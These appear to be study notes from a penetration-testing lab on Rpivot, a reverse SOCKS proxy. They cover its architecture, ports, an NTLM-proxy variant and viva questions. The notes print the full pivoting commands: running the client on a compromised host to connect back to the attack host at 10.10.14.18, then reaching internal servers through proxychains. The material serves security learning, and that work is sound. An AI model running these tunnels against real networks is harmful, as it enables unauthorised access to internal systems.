# 1. 🧠 What Is Rpivot?

**Rpivot** is a **reverse SOCKS proxy tool written in Python 2** for SOCKS tunneling.

Its main purpose is to allow a machine inside a network to establish a connection outward to an external server and expose access to internal resources through that connection.

The supplied material describes Rpivot as:

> A reverse SOCKS proxy tool that binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

### Basic concept

```text
Internal Network
      │
      │
      ▼
Compromised Client
      │
      │ Reverse connection
      ▼
External Server
      │
      ▼
SOCKS Proxy
      │
      ▼
Internal Resources
```

---

# 2. 🎯 The Problem Rpivot Solves

Suppose our attack host cannot directly reach an internal web server.

The internal web server is:

```text
172.16.5.135
```

and belongs to:

```text
172.16.5.0/23
```

We want to access:

```text
172.16.5.135:80
```

but our attack host doesn't have a direct route to that internal network.

A compromised Ubuntu server inside the network can act as the **Rpivot client**.

```text
                 ATTACK HOST
                 10.10.14.18
                       │
                       │ Rpivot
                       ▼
              Compromised Ubuntu
                    CLIENT
                       │
                       │ Internal Network
                       ▼
              Web Server
              172.16.5.135:80
```

---

# 3. 🖼️ Rpivot Architecture

![Image](https://images.openai.com/static-rsc-4/3lGvKIrHSBfuJd-eBZHUmRZQGmjMo5BY1N3AjVzbVKCltU22QpRxZstoXITtpFlfbfeZqc_kNkLkhYpT8hG23PiTDA2mJCxyHxKJRZIVE-slDlS5YWSf4jN1dOyJotYF3D_uvAJxGNaedn4eNtLD7l41VeeaYr14bhrJ1piQN1pTIvww5M9LNRIhUXXf235a?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/1H7zWsaMixTTJtMJ56o6YceibrcS_WtvZp-AGoHkBpvQXjvyhMlWWMDTVRDiCDgxm6NlDD6-rwZqGFFyt788QI50fNJOyCIIXpsWPS-rnWIgu7oWfSB730p0l4-80nvVFd4OshvhYCm5nvR3ctscF3vf-0e306HzRF7_tlFuu5ZlZ9FRaFQtL0dcy1B6jPVp?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/5UBBrzqIaBo3xCt1K9zTcDLxQWPXUoyMrTqjQgkZjhlrUzaJBhvhYw0k4zM5EJF11p1HWxqaqpO4RVcfDVgRSRPYz4aS9q7rMvtSK4Kt_d0y5SkRE0lXVKBNrqUtAVILCf8c5D6dYAQfA_lU0RfE6Y53_YKxzaWPlqml-XnkXsvv4_tpW_aP68mNOuBDc4oI?purpose=fullsize)

The architecture can be remembered as:

```text
                 ATTACK HOST
                 10.10.14.18
                      │
                      │
                Rpivot Server
                 :9999 / :9050
                      │
                      │ Reverse connection
                      ▼
               COMPROMISED HOST
                 Rpivot Client
                      │
                      ▼
              INTERNAL NETWORK
                      │
                      ▼
             172.16.5.135:80
                Web Server
```

---

# 4. 🔑 Important Rpivot Components

There are two main components:

```text
server.py
client.py
```

### `server.py`

Runs on the **attack host**.

It provides:

- The server-side connection point.
    
- SOCKS proxy functionality.
    
- A port for the client to connect to.
    

### `client.py`

Runs on the **compromised internal host**.

It establishes the reverse connection back to the Rpivot server.

---

# 5. 🔄 Reverse SOCKS Concept

The important idea is that the connection direction is reversed.

Normally:

```text
Attack Host
     │
     ▼
Internal Host
```

may not work because the internal network isn't directly reachable.

Rpivot instead does:

```text
Internal Host
     │
     │ Outbound connection
     ▼
Attack Host
```

Once this connection exists, the attack host can use the SOCKS proxy to reach internal resources.

---

# 6. 📊 Ports Used in the Example

There are two important server-side ports:

|Port|Purpose|
|--:|---|
|`9999`|Rpivot server/client connection|
|`9050`|Local SOCKS proxy|

The relationship is:

```text
Internal Client
       │
       │ connects
       ▼
Attack Host :9999
       │
       ▼
SOCKS Proxy :9050
       │
       ▼
Internal Resources
```

---

# 7. 🛠️ Step 1 — Clone Rpivot

The supplied command is:

```bash
git clone https://github.com/klsecservices/rpivot.git
```

This downloads the Rpivot source code.

The resulting directory is:

```text
rpivot/
```

---

# 8. 🖥️ Step 2 — Start `server.py`

On the attack host:

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

This is the main Rpivot server.

---

# 9. 🔍 Breaking Down the Command

```bash
python2 server.py
```

Runs the Rpivot server using Python 2.

### `--proxy-port 9050`

Creates the SOCKS proxy on:

```text
127.0.0.1:9050
```

according to the supplied workflow.

### `--server-port 9999`

Rpivot client connections arrive on:

```text
Attack Host:9999
```

### `--server-ip 0.0.0.0`

The server listens on all available interfaces.

---

# 10. 🧠 Two Ports, Two Jobs

This distinction is extremely important.

### Port `9999`

Used for:

```text
Client → Rpivot Server
```

### Port `9050`

Used for:

```text
Local applications → SOCKS Proxy
```

Therefore:

```text
             RPIVOT SERVER
                   │
        ┌──────────┴──────────┐
        │                     │
      :9999                  :9050
        │                     │
        ▼                     ▼
    Client             SOCKS Proxy
```

---

# 11. 📦 Step 3 — Transfer Rpivot to the Target

The supplied command is:

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

This copies the entire Rpivot directory to the compromised Ubuntu server.

Conceptually:

```text
Attack Host
     │
     │ SCP
     ▼
Ubuntu Pivot
     │
     ▼
/home/ubuntu/rpivot/
```

---

# 12. 🖥️ Step 4 — Start `client.py`

On the compromised Ubuntu server:

```bash
python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

The output:

```text
Backconnecting to server 10.10.14.18 port 9999
```

means that the Rpivot client is establishing an outbound connection to:

```text
10.10.14.18:9999
```

---

# 13. 🔄 The Reverse Connection

This is the key concept.

Instead of the attack host trying to reach the compromised server:

```text
Attack Host ───X───► Internal Host
```

the internal host connects outward:

```text
Internal Host
      │
      │ Outbound connection
      ▼
Attack Host:9999
```

Once established, this connection becomes the channel through which SOCKS traffic can be carried.

---

# 14. ✅ Step 5 — Confirm the Connection

The attack host receives:

```text
New connection from host 10.129.202.64, source port 35226
```

This confirms that the Rpivot client has connected back.

Conceptually:

```text
Ubuntu Pivot
     │
     │ Connection
     ▼
Rpivot Server
     │
     ▼
Connection Established
```

---

# 15. 🧠 What Happens After the Connection?

Now we have:

```text
Attack Host
     │
     ▼
Local SOCKS Proxy
127.0.0.1:9050
     │
     ▼
Rpivot Tunnel
     │
     ▼
Compromised Ubuntu
     │
     ▼
Internal Network
```

This is what allows applications on the attack host to communicate with internal systems through the compromised machine.

---

# 16. 🔀 SOCKS Proxy Concept

A SOCKS proxy acts as an intermediary.

Instead of:

```text
Firefox → Internal Web Server
```

we have:

```text
Firefox
   │
   ▼
SOCKS Proxy
   │
   ▼
Rpivot
   │
   ▼
Internal Network
   │
   ▼
Web Server
```

The application doesn't need a direct route to the internal network.

---

# 17. 🧰 Step 6 — Configure Proxychains

The material says to configure **Proxychains** to use:

```text
127.0.0.1:9050
```

This is the local Rpivot SOCKS proxy.

Conceptually:

```text
Proxychains
     │
     ▼
127.0.0.1:9050
     │
     ▼
Rpivot
     │
     ▼
Internal Network
```

---

# 18. 🌐 Step 7 — Access the Internal Web Server

The internal web server is:

```text
172.16.5.135:80
```

The supplied command is:

```bash
proxychains firefox-esr 172.16.5.135:80
```

The flow becomes:

```text
Firefox
   │
   ▼
Proxychains
   │
   ▼
127.0.0.1:9050
   │
   ▼
Rpivot
   │
   ▼
Compromised Ubuntu
   │
   ▼
172.16.5.135:80
```

---

# 19. 🖼️ Complete Rpivot Flow

```text
                         ATTACK HOST
                         10.10.14.18
                              │
               ┌──────────────┴──────────────┐
               │                             │
               ▼                             ▼
          Rpivot Server                 SOCKS Proxy
             :9999                         :9050
               │                             ▲
               │                             │
               │ Reverse Tunnel              │ Proxychains
               │                             │
               ▼                             │
        ┌─────────────────┐                  │
        │ Compromised     │◄─────────────────┘
        │ Ubuntu Host     │
        │ Rpivot Client   │
        └────────┬────────┘
                 │
                 │ Internal Network
                 ▼
        ┌─────────────────┐
        │ Web Server      │
        │ 172.16.5.135    │
        │ TCP/80          │
        └─────────────────┘
```

---

# 20. 🧠 Why Is This Called a Reverse SOCKS Proxy?

There are two important concepts:

### SOCKS

The server acts as a SOCKS proxy, allowing applications to send network traffic through it.

### Reverse

The internal client establishes the connection **outward toward the attack host**.

Therefore:

```text
SOCKS
  +
Reverse Connection
  =
Reverse SOCKS Proxy
```

---

# 21. 🔥 Why This Is Useful

This technique is useful when:

```text
Attack Host
      │
      X
      │
Internal Network
```

is inaccessible directly.

But:

```text
Internal Host
      │
      ▼
Attack Host
```

is allowed.

The reverse connection gives us a communication channel into the internal network.

---

# 22. 🧠 Important Mental Model

Don't think of Rpivot as:

> "A tool that magically gives access to every internal machine."

Instead think:

> **Rpivot creates a SOCKS-based communication path through a compromised internal host.**

Then:

```text
Application
     ↓
SOCKS
     ↓
Rpivot
     ↓
Internal Host
     ↓
Internal Service
```

---

# 23. 🔀 Rpivot vs Socat

You've now studied both.

### Socat

Usually provides a **specific TCP redirection**:

```text
Ubuntu:8080
     ↓
Socat
     ↓
Windows:8443
```

### Rpivot

Provides a **SOCKS proxy**:

```text
127.0.0.1:9050
       ↓
Rpivot
       ↓
Internal Network
       ↓
Multiple destinations
```

This makes Rpivot more flexible for accessing multiple internal services through the proxy.

---

# 24. 📊 Socat vs Rpivot

|Feature|Socat|Rpivot|
|---|---|---|
|Main function|TCP relay|Reverse SOCKS proxy|
|Forwarding|Specific endpoint|SOCKS-based|
|Typical use|Port redirection|Network pivoting|
|Example|`8080 → 8443`|`9050 → internal network`|
|Application proxy support|Not inherently SOCKS|Yes|
|Multiple destinations|More limited|More flexible|

---

# 25. 🌐 HTTP Proxy + NTLM Authentication

The source introduces another scenario.

Sometimes an organization prevents direct outbound connections by using an:

```text
HTTP Proxy
+
NTLM Authentication
```

In this situation, the compromised host may need to authenticate through the HTTP proxy before reaching the external Rpivot server.

---

# 26. 🧠 Why This Matters

Normally:

```text
Internal Host
      │
      ▼
Internet
      │
      ▼
Rpivot Server
```

But with an HTTP proxy:

```text
Internal Host
      │
      ▼
HTTP Proxy
      │
      │ NTLM Authentication
      ▼
Internet
      │
      ▼
Rpivot Server
```

Therefore, Rpivot provides an additional option for NTLM proxy authentication.

---

# 27. 🔐 NTLM Proxy Configuration

The supplied command is:

```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

The important parameters are:

|Parameter|Purpose|
|---|---|
|`--server-ip`|Rpivot server address|
|`--server-port`|Rpivot server port|
|`--ntlm-proxy-ip`|HTTP proxy IP|
|`--ntlm-proxy-port`|HTTP proxy port|
|`--domain`|Windows domain|
|`--username`|Username for proxy authentication|
|`--password`|Password for authentication|

---

# 28. 🔄 NTLM Proxy Flow

```text
                Internal Host
                     │
                     │
                     ▼
               HTTP Proxy
                :8081
                     │
                     │ NTLM Auth
                     ▼
                Internet
                     │
                     ▼
               Rpivot Server
                  :8080
```

The key lesson:

> **The reverse pivot may need to traverse an organization's outbound proxy controls.**

---

# 29. 📌 Important Commands

### Clone

```bash
git clone https://github.com/klsecservices/rpivot.git
```

### Start server

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### Transfer

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

### Start client

```bash
python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

### Browse through proxy

```bash
proxychains firefox-esr 172.16.5.135:80
```

---

# 30. 🧩 Important Port Map

Keep this table for revision:

|Component|Address|Port|
|---|---|--:|
|Attack Host|`10.10.14.18`|`9999`|
|Rpivot server connection|Attack Host|`9999`|
|Local SOCKS proxy|`127.0.0.1`|`9050`|
|Internal Web Server|`172.16.5.135`|`80`|
|Example HTTP proxy|`<IPaddressofProxy>`|`8081`|

The core mapping:

```text
Client
   ↓
Attack Host:9999
   ↓
Rpivot
   ↓
127.0.0.1:9050
   ↓
Internal Network
   ↓
172.16.5.135:80
```

---

# 31. 🧠 The Most Important Difference: Port Forward vs SOCKS

This is worth memorizing.

### Port Forwarding

You generally specify a particular destination:

```text
localhost:8080
      ↓
specific-server:80
```

### SOCKS Pivot

The application can request different destinations through the proxy:

```text
localhost:9050
      ↓
SOCKS
      ↓
Internal Network
      ├── Server A
      ├── Server B
      ├── Server C
      └── Server D
```

So SOCKS is useful when you don't want to create a separate forwarding rule for every internal service.

---

# 32. 🧠 Complete Learning Chain

You've now encountered several pivoting techniques:

```text
                PIVOTING
                   │
       ┌───────────┼────────────┐
       │           │            │
       ▼           ▼            ▼
      SSH         Socat       Rpivot
       │           │            │
       ▼           ▼            ▼
     -L/-R      TCP Relay    SOCKS Proxy
       │           │            │
       ▼           ▼            ▼
 Port Forward   Redirect     Network Pivot
```

---

# 33. 📝 Viva Questions

### Q1. What is Rpivot?

A reverse SOCKS proxy tool written in Python 2 for SOCKS tunneling.

### Q2. What are the two main components?

```text
server.py
client.py
```

### Q3. Where does `server.py` run?

The attack host.

### Q4. Where does `client.py` run?

The compromised internal host.

### Q5. What port does the example Rpivot server use for client connections?

```text
9999
```

### Q6. What port is used for the SOCKS proxy?

```text
9050
```

### Q7. What is the internal web server?

```text
172.16.5.135:80
```

### Q8. Why is the connection called "reverse"?

Because the internal client initiates the connection outward to the external Rpivot server.

### Q9. What tool is used to route Firefox through the SOCKS proxy?

```text
Proxychains
```

### Q10. What local SOCKS address is used?

```text
127.0.0.1:9050
```

### Q11. What is the purpose of `server.py`?

To provide the server-side endpoint and SOCKS proxy.

### Q12. What is the purpose of `client.py`?

To establish the reverse connection from the internal network to the Rpivot server.

### Q13. What can make a reverse pivot more difficult?

An outbound HTTP proxy requiring NTLM authentication.

---

# 34. ⚡ One-Minute Revision

```text
                 RPIVOT
                   │
                   ▼
          Reverse SOCKS Proxy
                   │
        ┌──────────┴──────────┐
        │                     │
        ▼                     ▼
   server.py              client.py
 Attack Host            Internal Host
        │                     │
        │ :9999               │
        └──────────┬──────────┘
                   │
              Reverse Tunnel
                   │
                   ▼
              SOCKS :9050
                   │
                   ▼
            Internal Network
                   │
                   ▼
          172.16.5.135:80
```

### Core commands:

```bash
git clone https://github.com/klsecservices/rpivot.git
```

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

```bash
python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

```bash
proxychains firefox-esr 172.16.5.135:80
```

---

# 🏆 35. Ultimate Memory Trick

Think:

```text
        RPIVOT
          │
          ▼
   "Bring the inside
    network to me."
          │
          ▼
Internal Client
      │
      │ Reverse connection
      ▼
Attack Host
      │
      ▼
SOCKS :9050
      │
      ▼
Internal Web Server
```

### The single most important concept:

> **Rpivot creates a reverse SOCKS tunnel: the compromised internal machine connects outward to the attack host, and the attack host can then use the SOCKS proxy to access resources inside the internal network.**

```text
Internal Host
      ↓
Reverse Connection
      ↓
Rpivot Server
      ↓
SOCKS :9050
      ↓
Internal Resources
```

**Remember the three numbers from this example:**

```text
9999 → Rpivot client/server connection
9050 → Local SOCKS proxy
80   → Internal web server
```

That distinction will make the entire Rpivot workflow much easier to understand.